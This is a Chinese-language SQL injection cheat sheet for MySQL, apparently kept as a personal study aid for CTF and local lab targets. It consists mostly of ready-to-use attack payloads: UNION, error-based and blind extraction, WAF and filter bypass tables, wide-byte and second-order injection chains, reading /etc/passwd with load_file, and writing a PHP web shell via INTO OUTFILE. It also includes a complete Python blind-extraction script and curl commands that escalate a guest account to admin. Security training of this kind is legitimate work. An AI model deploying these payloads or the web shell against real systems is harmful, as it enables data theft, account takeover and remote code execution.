# SQL 注入速查 v3.2(战地百科·仅 MySQL)

> 用法:做题卡住 → 按"我现在处于什么情况"翻章节 → 照 payload 改表名列名
> 命令环境:**CMD**(所有 URL 已预编码,空格=%20、#=%23,可直接粘进 CMD 的 curl 双引号内)
> 验证标注:✓(YYYY-MM-DD)=当日练武场实弹;✓(si 课)=课程靶机实弹;未标注 = 原理成立未搭场景
> 练武场(七场景):http://localhost:8083/lab/ -- get/like/post/insert/header/reg+pass(二次注入对)/noinfo(information_schema 被禁);index.php 只是菜单页

========================================================
## 0. 拿到题先走这个流程
========================================================

```
1. 找注入点:GET 参数 / POST 表单 / Cookie / UA / 留言板(存储)——凡是拼进 SQL 的用户输入
2. 判断类型:数字型(无引号包裹) or 字符串型(引号包裹) or 搜索型(LIKE %..%)
3. 探注入:
   - 数字型:id=1 and 1=1(正常) vs id=1 and 1=2(异常)——**必须成对比**;and 被拦时同法换 ||:id=1||1=1 vs id=1||1=2(单发恒真和原请求结果一样,什么都证明不了)
   - 字符串型:输入单引号 ' 看是否报错/异常
   - 搜索型:%' 或 ' 看是否异常
4. 判信道(用什么取数据):
   - 页面显示查询结果 → UNION / 报错
   - 只有'查到/没查到'两种反应 → 布尔盲注
   - 页面完全不变 → sleep 测时间 → 时间盲注
5. 枚举:库 → 表 → 列 → 数据
6. 被过滤 → 第六章绕过全集
```

========================================================
## 第一章 检测
========================================================

### 1.1 确认数字型注入 ✓(2026-08-29)

```
id=1 and 1=1     → 页面正常(条件真)
id=1 and 1=2     → 页面异常(条件假)
```
两发回显有差异 = 数字型注入确认。

### 1.2 and/or 被拦时:|| && 替代 ✓(2026-08-29)

```
id=1%7C%7C1%3D1    -> || 等价 OR;前提=默认 sql_mode(若目标开 PIPES_AS_CONCAT,|| 变字符串拼接,先探)
id=1%26%261%3D1   -> && 等价 AND;URL 必须写 %26%26
```

⚠️ && 假阳性陷阱(2026-08-29 实证):URL 裸写 && 时,& 是参数分隔符,服务端只收到
   id=1,&&1=1 丢失成独立参数。更毒:id=1&&1=1 仍返回原 id=1 的结果--看着像
   注入成功,实为原查询结果。鉴别法:换假条件 id=1&&1=2,仍返回数据=payload 丢失;
   id=1%26%261%3D2 无结果=注入真生效

⚠️ 单竖线 | 不是 OR(2026-08-30 补):MySQL 里 | 优先级高于 =,1|1=2 按 (1|1)=2 解析→假;
   而 1||1=2 是 1||(1=2)→真。URL 裸写时必须**两个 |**,少写一个探针结论直接反转。

### 1.3 确认字符串型注入

```
输入 '            → 报错或异常 = 引号被拼进 SQL
输入 ' or '1'='1  → 恒真绕过
```

### 1.4 确认时间信道 ✓(2026-08-29)

```
id=1 and sleep(3) → 响应 3 秒左右 = 注入存在
```

========================================================
## 第二章 场景家族(不同位置,不同打法)
========================================================

### 2.1 数字型(GET 参数)✓

注入点无引号包裹,直接拼 SQL。全部信道适用(见第三章)。

### 2.2 字符串型(登录框)✓(si 课实弹)

```sql
admin'#              -- 闭合引号,# 注释掉后面(已知用户名免密;' or '1'='1 才是万能密码)
' or '1'='1          -- 恒真
' union select 1,2#  -- 字符串场景的 union
```

**坑**:# 在 URL 里要编码 %23;-- 后必须跟空格。

### 2.3 搜索型(LIKE)✓(2026-08-29)

```sql
kw = x%' or 1=1#     -- 逃出 %..% 包裹,恒真返全表
kw = %' and extractvalue(1,concat(0x7e,(select ...))) and '
```

**坑**:% 自己也要转义(%25);闭合的是 %' 两个字符。

### 2.4 POST/表单 ✓(2026-08-29)

+ 号三态(2026-08-29 实证,CMD):
- 浏览器表单:自动把 + 编码 %2B,存字面 +,安全
- curl 裸 -d "username=admin+x":+ 被解码成空格,存的是 'admin x'!
- curl --data-urlencode:自动编码,存字面 +,安全
- 结论:curl 发带 + 的 payload 用 --data-urlencode 或手写 %2B
打法与 GET 相同,只是数据走 POST:

```
curl -X POST "http://目标/post.php" -d "username=admin%23" -d "password=x"
```

### 2.5 INSERT(留言板/注册)✓(2026-08-30 实弹)

INSERT 的值被引号包着(VALUES('$a','$b'))——想让表达式当表达式执行,必须**先破引号、再配平括号列数**:

```sql
name = n', extractvalue(1,concat(0x7e,(select ...))) )#
→ INSERT INTO fb(name,msg) VALUES('n', extractvalue(...))#','x')
   # 注释掉尾巴,括号配平 → XPATH 报错把数据带出来 ✓(2026-08-30)
```

**坑(2026-08-30 实测,推翻旧结论,以此为准)**:
- **"假前缀+AND / 真前缀+OR 是死格"不成立**:CLI 临时表实测 5.7.44,严格+宽松两种 sql_mode 各跑一轮,前缀×and/or 四种组合 extractvalue **全部执行、全部报 1105**——MySQL 不保证短路,别赌它;
- 1105 是 ERROR 不是 warning,宽松模式也不降级,语句照样中止(行没插进去);
- **值不破引号 = 表达式整个当字符串存进去**,页面还显示"提交成功",零报错——最安静的坑;
- 保险打法仍是纯函数值 + 注释配平:少一层对优化器的依赖。

### 2.6 HTTP 头(UA/Referer 入库)✓(2026-08-30)

UA 是单列 INSERT(无列数问题),破引号后 or/and 均可触发:

```bash
curl -A "x' or extractvalue(1,concat(0x7e,(select database()))) and '" "http://目标/header.php"
→ SQL 错误:XPATH syntax error: '~ctf' ✓(2026-08-30)
```

**坑(2026-08-30 实证)**:
- UA 不破引号 → 表达式当字面字符串存进去,"已记录"且零报错;
- 页面在展示报错前又跑了别的查询(如 SELECT 最近记录)时,mysqli_error 被清零,**报错被页面吃掉**——页面不报错 ≠ 没报错,金标准是"行到底插没插进去"(查表)。

头注入的入口:任何把 UA/Referer/Cookie **写进数据库或日志**的页面。

### 2.7 二次注入 -- 见第七章(重点课题,独立成章)



========================================================
## 第三章 信道家族(怎么把数据取出来)
========================================================

### 3.1 UNION(页面显示查询结果时)✓(2026-08-29)

```
① 数列数:  1 order by 1 → 正常 … 直到报错 Unknown column
② 探位置:  -1 union select 1,2    → 页面显示 1 或 2 = 可用列(只渲染一个列位就用显示的那个)
③ 查库名:  -1 union select database(),2
④ 查表名:  -1 union select table_name,2 from information_schema.tables where table_schema=database()
⑤ 查列名:  -1 union select column_name,2 from information_schema.columns where table_schema=database() and table_name='表名'
⑥ 查数据:  -1 union select 列名,2 from 表名
⑦ 读文件:  -1 union select @@secure_file_priv,2 → 确认目录后 load_file('/路径'),2  ← 需 FILE 权限
```

**坑**:union 前后列数必须一致;id=-1(或 0)是让前面的查询查不到行,只显示 union 结果——**用 -1 更稳**,不赌 0 这行恰好存在;枚举忘加 table_schema=database() 会列出全库的表。

### 3.2 报错注入(页面显示数据库报错时)✓(2026-08-29)

```sql
① 查表:  1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
② 查列:  1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='表名')))
③ 查数据:1 and extractvalue(1,concat(0x7e,(select data from secret_table)))
④ 超长:  报错只显示 32 字符 → substr 分段,每段 30:
   1 and extractvalue(1,concat(0x7e,(select substr(data,1,30) from secret_table)))
```

**报错函数三选**:
```
extractvalue(1,concat(0x7e,(select ...)))      -- 2 参,首选
updatexml(1,concat(0x7e,(select ...)),1)       -- 3 参,被禁换用
floor 报错(带数据版)                            -- 见 6.4;版本/执行计划敏感,先探再打
```

**坑**:extractvalue 是 2 个参数;0x7e 是波浪号,报错从 ~ 后开始读;子查询必须 1 行(多行用 group_concat)。

### 3.3 布尔盲注(只有'查到/没查到'两种反应)✓(2026-08-29)

```sql
① 确认:  1 and 1=1(正常) vs 1 and 1=2(异常)
② 量长:  1 and length((select flag from t))=17
③ 逐字符二分:
   1 and ascii(substr((select flag from t),1,1))>100
   1 and ascii(substr((select flag from t),1,1))=102
④ 盲枚举表名:
   1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100
   -- 第二张表:limit 1,1;第三张:limit 2,1 依此推
   1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))>100
⑤ and/or 全被拦 → 异或 ^ ✓(2026-08-30 实弹):
   0^(ascii(substr((select flag from t),1,1))>100)   -- 0^ 同极性:条件真→有结果
   1^(ascii(substr((select flag from t),1,1))>100)   -- 1^ 反极性:条件真→无结果,页面判断要倒过来
   原理:1^1=0、1^0=1;^ 无短路依赖(MySQL 本就不保证短路,见 2.5)
   适用面:数字型注入点是主场;字符串登录框也能打但极性反直觉——'admin'^(1=2) 反而登录成功
   (实测 2026-08-30:'admin' 强转数字得 0,username=0 匹配所有非数字开头的用户名,全表通过)
```

40 字符手猜太慢 → 用第八章 Python 模板。

### 3.4 时间盲注(页面完全不变)✓(2026-08-29)

```sql
① 确认:  1 and sleep(3)                      → 页面卡 3 秒 = 注入存在
② 核心句式(条件真才 sleep):
   1 and if(ascii(substr((select flag from t),1,1))>100, sleep(1), 0)
③ 量长:  1 and if(length((select flag from t))=17, sleep(1), 0)
④ and 被拦 → 异或:  1^if(条件,sleep(1),0)   ✓(2026-08-30 实弹)
   ⚠️ sleep 被求值的次数由优化器定,同一条 payload 时长会翻倍(实测 2026-08-30:and 版 1 次 2.2s;
      裸塞/XOR 版 3 次 6.2s;POST or 版 2 次 4.2s)——判真假只看有无延迟差,别用绝对时长校准
```

40 字符手猜太慢 → 第八章 ask_time 版:extract 里把 ask 换 ask_time,其余不动。

### 3.5 无列名注入(information_schema 被禁时)✓(2026-08-30)

```sql
-- ① join 报错爆列名(不知道列名时,从报错里一个个抠):
1 and (select * from (select * from 表名 a join 表名 b)c)
   → Duplicate column name 'id'        ← 第一个列名送上门
1 and (select * from (select * from 表名 a join 表名 b using(id))c)
   → Duplicate column name 'data'      ← 逐个 using 已知列,报错吐下一个
-- ② 无列名查数据(反引号包"不存在的列名",数据按位置对齐):
0 union select 1,`2`,3 from (select 1,2,3 union select id,data,3 from 表名)a
   → union 两行都会出:第一行是字面量 1,2,3;第二行的 `2` 位置 = 目标数据
```
**原理**:派生表的列名抄自 union 的第一个 select(名字随你起),数据按**位置**对齐——information_schema 禁不禁,数据照样走位置。
**练武场第 7 关**:noinfo.php?id=...(information_schema 被禁)✓(2026-08-30 两式实弹)

========================================================
## 第四章 堆叠(分号执行多条语句)
========================================================

**前提**:驱动支持多语句(mysqli_multi_query)——si7 架构已实弹 ✓;普通 mysqli_query 不支持(练武场 get.php 就不行)。

```sql
① 看库表:  1;show databases
           1;show tables
② 看结构:  1;describe 表名
③ 查数据:  1;select data from 表
④ 改数据:  1;update users set role='admin' where username='guest'
⑤ 写shell: 1;select '<?php system($_GET[1]);?>' into outfile '/var/www/html/shell.php'
```

**坑**:URL 分号编码 %3B;写文件需 FILE 权限 + secure_file_priv 允许。

========================================================
## 第五章 文件读写
========================================================

### 读文件(load_file)✓(si8 课实弹;练武场 ctf 用户无 FILE 权限,场景受限)

```sql
-- 先查限制(读不到先查这个):
0 union select @@secure_file_priv,2
0 union select load_file('/etc/passwd'),2     -- 试金石(Linux)
0 union select load_file('C:/windows/win.ini'),2   -- 试金石(Windows 靶机)
```

**读哪个文件(侦查法,2026-08-25 实战补)**:
- 经验路径:web 根 /var/www/html/、config.php、.env、wp-config.php
- 读了配置 → 里面写着更多路径(日志/上传/include),一个文件牵一串
- 报错泄路径:warning 常带完整路径
- MySQL 自报家门:@@basedir / @@datadir
- CTF 惯例:/flag /flag.txt /flag.php
- load_file 当探针:NULL = 不存在 OR 无权限 OR 被 secure_file_priv 拦,三种归因分不清;有内容 = 确定存在且可读

### 写文件(into outfile,需堆叠或 union)

```sql
1;select '<?php system($_GET[1]);?>' into outfile '/var/www/html/shell.php'
```

**四前提**:FILE 权限 + 路径可写 + secure_file_priv 不限 + 目标文件不存在(into outfile 不能覆盖已有文件,静默失败)。

========================================================
## 第六章 绕过全集(拦什么换什么)
========================================================

### 6.1 空格族

| 被拦 | 换什么 | 例 |
|------|--------|-----|
| 空格 | /**/ | 1/**/union/**/select/**/1,2 |
| 空格 | 括号嵌套 ✓ | 0 union(select(1),(2),(3)) |
| 空格 | %09 %0a %0b %0c %0d | id=1%09and%091=1 |

### 6.2 逗号族 ✓(2026-08-29)

| 被拦 | 换什么 | 例 |
|------|--------|-----|
| substr 的逗号 | from for | substr(data from 1 for 5) |
| limit 的逗号 | offset | limit 1 offset 0 |

### 6.3 引号族

| 被拦 | 换什么 | 例 |
|------|--------|-----|
| 引号 | 十六进制 0x | table_name=0x666c6167 |
| 引号 | char() | char(102,108,97,103) |

### 6.4 关键字族

| 被拦 | 换什么 | 例 |
|------|--------|-----|
| 小写关键字 | 大小写(过滤没写/i) | UnIoN SeLeCt |
| union/select 整词被拦 | 内联注释 ✓(2026-08-29) | 0/*!50000union*//*!50000select*/1,2,3 |
| 报错函数全被禁 | floor 报错(版本敏感) | 见下 |

内联注释原理:/*!50000xx*/ = "MySQL 版本 >= 5.00.00 才执行里面的内容"——payload 实弹有效 ✓。
它绕的是**不解析 MySQL 版本注释的 WAF**(词边界/令牌级匹配);**纯子串匹配的 WAF 既拦不住它也不放行它**——
/*!50000union*/ 里照样有连续的 union 子串,子串 WAF 照拦。绕不过去时先判 WAF 是哪一类。

floor 报错(版本敏感,2026-08-29 实证):
- 经典 payload:SELECT count(*),concat(floor(rand(0)*2),0x3a,(select version()))a FROM information_schema.tables GROUP BY a
- 老版本(5.5/5.6)报 Duplicate entry 泄数据;**本靶机 5.7.44 实测不触发**(正常返回两组)
- 用前先探版本:0 union select version(),2;floor 触发与否取决于执行计划,5.7 行为分化,先试再定

### 6.5 and/or 族 ✓(2026-08-29)

```
and -> &&   (URL 必须 %26%26,裸 && 是假阳性,见 1.2 陷阱)
or  -> ||   (URL 裸写必须两个 |;单个 | 是位或,语义相反,见 1.2)
and/or 全被拦 -> ^(异或,数字型盲注可用;0^ 同极性 / 1^ 反极性,打法见 3.3⑤ 3.4④)
```

### 6.6 比较符族

```
= 被拦 → like / in / between    where id like 1
```

### 6.7 函数替换族

```
sleep 被禁 → benchmark(10000000,md5('a'))     ✓(2026-08-29,延迟可见)
if 被禁 → case when 条件 then 1 else 0 end    ✓(2026-08-29)
substr 被禁 → mid / substring
updatexml 被禁 → extractvalue
```

### 6.8 宽字节(addslashes + GBK)✓(si9 课实弹)

```
username=%bf%27%20or%201=1%23
%bf 吃掉转义反斜杠 → 引号裸奔
```

========================================================
## 第七章 二次注入(全链)✓(2026-08-29)
========================================================

**原理**:注册口 addslashes 转义 → payload 安全入库;但存储值后来被**别的查询裸拼**使用 → 引号复活。转义只保护"当次",不保护"以后"。

**三步全链(练武场 reg/pass/post 实测)**:

```
① 注册:用户名 admin'-- -  密码随意
   (INSERT 被转义,库里实际存下 admin'-- - 这个值,注册页会显示你的用户编号)
② 改密:pass.php?id=编号 → 系统从库里取出存储值裸拼进 UPDATE:
   UPDATE lab_users SET password='新' WHERE username='admin'-- -'
   引号复活 + 注释 → 改的是 ADMIN 的密码!
③ 登录:admin + 新密码 → 接管管理员,flag 到手
```

**注册口再"安全"也没用——它的输出是另一个查询的输入。这就是"二次"。**

========================================================
## 第八章 Python 盲注脚本模板
========================================================

**结构:两个探测函数 + 一个通用提取器。ask = 布尔版(页面有两种反应时用),ask_time = 时间版(页面完全不变时用),extract 两者通用——extract 里用哪个 ask,由页面信道决定。**

```python
import requests, time

def ask(cond):   # 布尔版:看页面文字;前缀按注入点风格改(/**/ / %20 / 空格)
    for _ in range(3):   # 网络抖动重试 3 次,仍失败硬退——错要响,绝不静默
        try:
            return '正常时页面有的字' in requests.get(URL + '1/**/and/**/' + cond, timeout=10).text
        except requests.RequestException:
            continue
    raise RuntimeError('ask 3 连败,先查网络/靶机')

def ask_time(cond):   # 时间版:看响应耗时;前缀同样 /**/,拦空格的目标两个函数都能用
    for _ in range(3):
        t0 = time.time()
        try:
            requests.get(URL + '1/**/and/**/if(' + cond + ',sleep(1),0)', timeout=10)
            return time.time() - t0 > 0.6   # 正常返回:卡=真
        except requests.RequestException:
            continue   # 超时/抖动:重试;绝不把超时耗时计入判断(超时判真=静默写错一个 bit)
    raise RuntimeError('ask_time 3 连败,先查网络/靶机')

def extract(subq, stop='}', length=None):
    out = ''
    for pos in range(1, (length or 120) + 1):   # 上限 120;撞顶未见 stop 扩到 200
        lo, hi = 32, 127        # 仅适用 ASCII 数据;中文/高位字节把 hi 提到 255 或改 hex 比较
        while lo < hi:
            mid = (lo + hi) // 2
            if ask('ascii(substr((%s),%d,1))>%d' % (subq, pos, mid)):
                lo = mid + 1
            else: hi = mid
        ch = chr(lo)
        if length is None and ch == ' ': break   # 没给 length 时空格当数据结束哨兵(仅适配无空格数据)
        out += ch
        if ch == stop: break
    return out
    # 数据本身含空格:别赌哨兵,先用盲注量长(3.3② 的 length() 法)把 length 传进来,再逐位取

# 用法:
# extract('database()') → 库名
# extract('select table_name from information_schema.tables where table_schema=database() limit 0,1') → 表名
# extract('select flag from flag_table') → 数据
# 时间盲注版:把 ask 换 ask_time,extract 里其余不动
```

**POST 注入点(登录框类)只换发请求那一行,重试/超时/判据结构全同** ✓(2026-08-30 实测):

```python
# ask 版:
r = requests.post(URL, data={'username': "admin'/**/and/**/" + cond + "#", 'password': 'x'}, timeout=10)
# ask_time 版:
r = requests.post(URL, data={'username': "admin'/**/and/**/if(" + cond + ",sleep(1),0)#", 'password': 'x'}, timeout=10)
# 布尔判据换该页成功/失败两种文案之一(实测 post.php:'管理员登录成功' vs '用户名或密码错误',差分清晰)
# 注入字段叫什么按目标表单改;引号闭合方式跟着 2.2/2.5 的场景走
# 注入点在 Cookie/请求头:换 cookies={'k': "payload"} 或 headers={'User-Agent': "payload"},判据结构不变(UA 场景见 2.6)
```

========================================================
## 第九章 函数一句话速查
========================================================

| 函数 | 干什么 | 一句话用法 |
|------|--------|-----------|
| substr(s,p,l) | 截取 | substr('abc',1,2)='ab';p 从 1 起;**逗号被拦换 from p for l** |
| ascii(c) | 字符→数字 | ascii('a')=97;盲注比较用 |
| char(n) | 数字→字符 | char(102)='f';绕过引号 |
| concat(a,b) | 拼接 | 报错注入拼数据;有 NULL 结果 NULL |
| group_concat(col) | 多行→一行 | 枚举表名列名必用(子查询只能 1 行) |
| length(s) | 字节数 | 盲注先量长度 |
| hex(s) | 转十六进制 | 绕过引号:0x666c6167='flag' |
| if(c,a,b) | 条件分支 | 时间盲注:if(条件,sleep(1),0);**被拦换 case when** |
| sleep(n) | 卡 n 秒 | 确认注入 / 时间盲注;**被拦换 benchmark** |
| benchmark(n,e) | 重复执行 n 次做延迟 | sleep 被禁的时间盲注替代 |
| database() | 当前库名 | 枚举第一步 |
| version() | 版本 | 决定用哪个报错函数 |
| user() | 当前用户 | 看是不是 root |
| load_file(p) | 读文件 | 三前提(FILE 权限/路径/secure_file_priv) |
| updatexml | 报错注入 | 3 个参数 |
| extractvalue | 报错注入 | 2 个参数 |
| substring(s,p,l) | 同 substr(全名) | substr 被禁的替身 |
| mid(s,p,l) | 同 substr | substr 被禁的替身 |

========================================================
## 第十章 报错导航
========================================================

| 报错 | 意思 | 怎么办 |
|------|------|--------|
| near 'xxx' | 语法错 | 看 xxx 附近 |
| near '' | 括号/引号没闭合 | 数括号 |
| Unknown column 'x' | 列不存在 / order by 超列数 | 枚举列名 / 数列数 |
| Subquery returns more than 1 row | 子查询多行 | 加 group_concat 或 limit 1 |
| Incorrect parameter count | 函数参数个数错 | extractvalue=2参 updatexml=3参 |
| can't open file | 读文件被拒 | 查 @@secure_file_priv |
| 枚举结果尾部静默丢失 | group_concat_max_len 默认 1024 截断 | SET SESSION group_concat_max_len=102400; 或分段 substr |
| The used SELECT statements have a different number of columns | UNION 列数不匹配 | 数列数对齐 |
| Truncated incorrect DOUBLE value | 字符串被硬转数字(算术语境) | 宽松模式=warning 静默值变 0;严格模式=语句中止;先查前缀引号闭合 |
| [] operator not supported / Illegal offset type | PHP 层报错(非 MySQL) | 常规题=代码 bug;**机关题里它是布尔信道**:报错出现/消失=条件真/假,是信号不是故障 |
| XPATH syntax error: '~xxx' | 报错注入成功 | xxx 就是你要的数据 |

========================================================
## 心法
========================================================

> 先判场景再判信道 ｜ 报错是导航 ｜ 拦什么换什么 ｜ 盲注就写脚本 ｜ 一次只改一个变量 ｜ INSERT 值位置就是表达式 ｜ 二次注入的雷是存进去的 ｜ 概念树常青,payload 是叶子

========================================================
## 附录:si7 / si7b 实战档案(堆叠,完整 CMD 弹药;2026-08-29 实证修正)

⚠️ si7 与 si7b 是两道题,别混:si7 库(ctf7)没有 users 表,只有 products/secret_table;
   UPDATE 改角色是 si7b 的剧本(ctf7b.users 有 role 列)。以下按各自真实靶面给弹:

```
靶机: http://localhost:8083/si7/  (si7,ctf7 库)
① 确认注入:
curl "http://localhost:8083/si7/?id=1%20and%201=1"
② 堆叠查表(%3B = 分号):
curl "http://localhost:8083/si7/?id=1%3Bshow%20tables"
③ 堆叠查数据:
curl "http://localhost:8083/si7/?id=1%3Bselect%20data%20from%20secret_table"

靶机: http://localhost:8083/si7b/  (si7b,ctf7b 库,有 users+role)
① 堆叠改角色:
curl "http://localhost:8083/si7b/?id=1%3Bupdate%20users%20set%20role=%27admin%27%20where%20username=%27guest%27"
② 同一请求内重读角色 -> flag 当场出
```

**坑**:si7/si7b 实测堆叠回显正常(show/查数据都直接显示在页面上);"show 结果未必显示"是对陌生靶机的一般提醒。两题架构不同,拿 payload 先确认打的是哪道题。
